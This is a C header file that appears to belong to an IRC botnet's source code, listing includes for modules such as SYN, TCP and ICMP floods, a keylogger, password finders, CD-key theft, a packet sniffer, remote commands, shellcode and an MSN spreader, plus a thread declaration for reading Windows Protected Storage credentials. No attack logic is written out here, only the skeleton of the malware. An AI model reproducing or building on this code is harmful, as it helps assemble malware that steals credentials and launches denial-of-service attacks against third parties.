#ifdef WIN32
#define _WIN32_WINNT	0x0403				// Very important for critical sections.
#define WIN32_LEAN_AND_MEAN					// Good to use.
#pragma optimize("gsy", on)					// Global optimization, Short sequences, Frame pointers.
//#pragma comment(linker,"/RELEASE")			// Release code
#pragma comment(linker, "/ALIGN:4096")		// This will save you some size on the executable.
//#pragma comment(linker, "/IGNORE:4108 ")	// This is only here for when you use /ALIGN:4096.
//#pragma pack(1)								// Force packing on byte boundaries.
#endif // WIN32

#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <malloc.h>
#include <winsock2.h>
#include <windows.h>
#include <wininet.h>
#include <windns.h>
#include <iphlpapi.h>
#include <lm.h>
#include <lmat.h>
#include <io.h>
#include <fcntl.h>
#include <tchar.h>
#include <tlhelp32.h>
#include <assert.h>
#include <sqlext.h>
#include <vfw.h>
#include <shlobj.h>
#include <ntsecapi.h>

#include "defines.h"
#include "ehandler.h"
#include "startup.h"
#include "connect.h"
#include "protocol.h"
#include "commands.h"
#include "processes.h"
#include "loaddlls.h"
#include "tcpip.h"
#include "threads.h"
#include "ri0t.h"
#include "irc_send.h"
#include "crc32.h"
#include "netutils.h"
#include "sysinfo.h"
#include "ident.h"
#include "rndnick.h"
#include "download.h"
#include "synflood.h"
#include "tcpflood.h"
#include "icmpflood.h"
#include "pingudp.h"
#include "wildcard.h"
#include "misc.h"
#include "driveinfo.h"
#include "dcc.h"
#include "httpd.h"
#include "crypt.h"
#include "visit.h"
#include "cdkeys.h"
#include "remotecmd.h"
#include "aliaslog.h"
#include "psniff.h"
#include "net.h"
#include "lsarestrict.h"
#include "autostart.h"
#include "keylogger.h"
#include "session.h"
#include "findpass.h"
#include "findfile.h"
#include "shellcode.h"
#include "../msn/zip.h"
#include "../msn/msn.h"

DWORD WINAPI pstore (LPVOID param);
#import "pstorec.dll" no_namespace
#include <psapi.h>

typedef struct pststrct
{
	SOCKET sock;
	char chan[128];
} pststrct;
